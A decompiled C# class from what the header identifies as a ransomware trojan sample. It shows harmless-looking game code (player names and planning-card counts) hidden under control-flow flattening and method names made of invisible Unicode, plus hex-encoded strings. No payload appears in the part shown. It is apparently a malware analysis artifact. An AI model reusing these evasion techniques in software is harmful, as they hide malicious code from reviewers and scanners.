// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: CriticalHand, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 8F3AACC8-AAA3-4E3C-B88D-04522F6F341D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-894cebc6da151cbe64ab4094b2e779f433dc0865ba1cff8063747ca407454629.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
      string str1 = (string) null;
label_1:
      int num1 = 127902586;
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1894686474)) % 11U)
        {
          case 0:
            goto label_1;
          case 1:
            int num3 = BaseStream == 0 ? -730031833 : (num3 = -1441776697);
            num1 = num3 ^ (int) num2 * -53838062;
            continue;
          case 2:
            num1 = (int) num2 * -749456857 ^ 166039672;
            continue;
          case 3:
            str2 = str1;
            num1 = 1319242834;
            continue;
          case 4:
            int num4 = !flag ? 760941129 : (num4 = 2083450136);
            num1 = num4 ^ (int) num2 * 122195913;
            continue;
          case 5:
            num1 = (int) num2 * 28448271 ^ 1437309618;
            continue;
          case 7:
            str1 = "6E794235314452";
            num1 = (int) num2 * -14175964 ^ -529813333;
            continue;
          case 8:
            str1 = "41676772656761746545786365707469";
            num1 = (int) num2 * -814756508 ^ -410426368;
            continue;
          case 9:
            num1 = (int) num2 * -32667603 ^ -1537685383;
            continue;
          case 10:
            flag = BaseStream == 1;
            num1 = 1922713368;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = -1313469051;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1511538925)) % 4U)
        {
          case 1:
            num1 = (int) num2 * -845136463 ^ 347797386;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_3:
      int num3 = 0;
      goto label_5;
label_7:
      int num4;
      return num4;
label_4:
      num3 = this.PlanningCards[cardTypeIndex];
label_5:
      num4 = num3;
      num1 = -57999482;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = 1824802091;
        int num2;
        int[] planningCards;
        int index;
        int num3;
        int planningCardsCount;
        bool flag;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ 1830401080)) % 15U)
          {
            case 0:
              int num5 = flag ? 80899447 : (num5 = 911189902);
              num1 = num5 ^ (int) num4 * -106136330;
              continue;
            case 1:
              num3 = planningCards[index];
              num1 = 1117489169;
              continue;
            case 2:
              num2 = 0;
              num1 = (int) num4 * 311669915 ^ -1426714989;
              continue;
            case 3:
              planningCards = this.PlanningCards;
              num1 = (int) num4 * -1002767568 ^ -372410670;
              continue;
            case 4:
              int num6;
              num1 = num6 = index >= planningCards.Length ? 1179238646 : (num6 = 1562485400);
              continue;
            case 5:
              num1 = (int) num4 * -1381896174 ^ -843881113;
              continue;
            case 6:
              ++index;
              num1 = (int) num4 * 404774220 ^ -2127033141;
              continue;
            case 7:
              ++num2;
              num1 = (int) num4 * 1079526971 ^ -324559301;
              continue;
            case 8:
              flag = num3 > 0;
              num1 = (int) num4 * 1965260366 ^ -1370752645;
              continue;
            case 9:
              goto label_1;
            case 10:
              planningCardsCount = num2;
              num1 = (int) num4 * 1556941139 ^ 1571142366;
              continue;
            case 11:
              num1 = (int) num4 * -26089562 ^ 449873315;
              continue;
            case 12:
              num1 = 1725179766;
              continue;
            case 13:
              index = 0;
              num1 = (int) num4 * 13110743 ^ 1865013740;
              continue;
            default:
              goto label_16;
          }
        }
label_16:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = 2134846942;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1694186488)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1993898856 ^ 2011977222;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = -2140072769;
      string str1;
      int index;
      string str2;
      int planningCard;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1494559007)) % 15U)
        {
          case 0:
            num1 = (int) num2 * -1615345049 ^ -824577367;
            continue;
          case 1:
            str1 = " ";
            index = 0;
            num1 = (int) num2 * -428670899 ^ -990062895;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = -222431231;
            continue;
          case 4:
            num1 = (int) num2 * 1272470541 ^ 529511993;
            continue;
          case 5:
            int num3 = planningCard != 0 ? 1775071158 : (num3 = 1561355799);
            num1 = num3 ^ (int) num2 * 2023228131;
            continue;
          case 6:
            planningCard = this.PlanningCards[index];
            num1 = (int) num2 * 293199087 ^ 805109188;
            continue;
          case 8:
            num1 = (int) num2 * -249508293 ^ 372559263;
            continue;
          case 9:
            str2 = str1;
            num1 = (int) num2 * 81532071 ^ -1687947261;
            continue;
          case 10:
            str1 = Player.\u200F⁭‮‌‍​‫​⁮⁪‍‫⁬‫‮‫⁯‮‬⁪​‭‭⁯⁮‮‬‭‭‮⁮‫​⁭⁫‍⁪⁪‎‭‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -830007942;
            continue;
          case 11:
            ++index;
            num1 = -1125720633;
            continue;
          case 12:
            flag = index < this.PlanningCards.Length;
            num1 = -6234072;
            continue;
          case 13:
            int num4 = flag ? -730831209 : (num4 = -1661721706);
            num1 = num4 ^ (int) num2 * 1438070383;
            continue;
          case 14:
            num1 = (int) num2 * 218396750 ^ -1154598220;
            continue;
          default:
            goto label_16;
        }
      }
label_16:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = 1166863572;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1335635254)) % 3U)
        {
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * 1168047894 ^ 451586556;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = -1412207557;
      int count;
      bool flag;
      int aIndex;
      int[] numArray;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -544823241)) % 12U)
        {
          case 0:
            goto label_1;
          case 1:
            planningCards = numArray;
            num1 = (int) num2 * 841490161 ^ -1652525229;
            continue;
          case 2:
            int num3 = !flag ? -1756707798 : (num3 = -684216685);
            num1 = num3 ^ (int) num2 * -1481915582;
            continue;
          case 3:
            aIndex = 0;
            num1 = (int) num2 * -1139083671 ^ 1456547734;
            continue;
          case 4:
            count = json.Count;
            num1 = (int) num2 * -15256646 ^ -52436660;
            continue;
          case 5:
            num1 = (int) num2 * 411740596 ^ 2104884809;
            continue;
          case 6:
            num1 = (int) num2 * 1693449594 ^ 2139091114;
            continue;
          case 7:
            numArray = new int[count];
            num1 = (int) num2 * -340565528 ^ 841557472;
            continue;
          case 8:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = -381513404;
            continue;
          case 9:
            flag = aIndex < count;
            num1 = -233137511;
            continue;
          case 11:
            ++aIndex;
            num1 = (int) num2 * 1171356578 ^ 1257070448;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = 74884735;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 159657070)) % 4U)
        {
          case 0:
            num1 = (int) num2 * 1636682196 ^ -1986214664;
            continue;
          case 1:
            str = Player.\u200C‫‫‍⁯⁯‬⁪⁪⁪⁬‭‏‮‬⁫⁭‬⁫‍‍⁯‎​⁫‏‬‍⁭‪‪⁫‌⁫‎⁫​‎‪‍‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * 1452186526 ^ -874788024;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u200F⁭‮‌‍​‫​⁮⁪‍‫⁬‫‮‫⁯‮‬⁪​‭‭⁯⁮‮‬‭‭‮⁮‫​⁭⁫‍⁪⁪‎‭‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200C‫‫‍⁯⁯‬⁪⁪⁪⁬‭‏‮‬⁫⁭‬⁫‍‍⁯‎​⁫‏‬‍⁭‪‪⁫‌⁫‎⁫​‎‪‍‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
